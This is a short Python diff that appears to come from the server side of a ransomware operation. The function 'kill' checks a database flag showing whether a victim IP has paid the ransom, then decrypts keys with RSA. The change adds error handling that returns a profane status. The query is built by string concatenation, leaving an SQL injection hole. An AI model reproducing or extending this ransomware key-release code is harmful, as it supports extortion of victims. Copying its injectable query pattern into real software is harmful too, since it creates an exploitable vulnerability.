@@ -39,8 +39,12 @@ def kill(ip,cipher):
         )
     mycursor= mydb.cursor()
     cmd = 'select ransome from ips where ips=\''+ip+'\';'
-    mycursor.execute(cmd) 
-    if(mycursor.fetchone()[0]):
+    mycursor.execute(cmd)
+    try:
+        data = mycursor.fetchone()
+    except:
+        return {'status':'Fuck off','keys':0}
+    if(data[0]):
         keys = RSA.d_main(cipher)
         status='success'
     else:
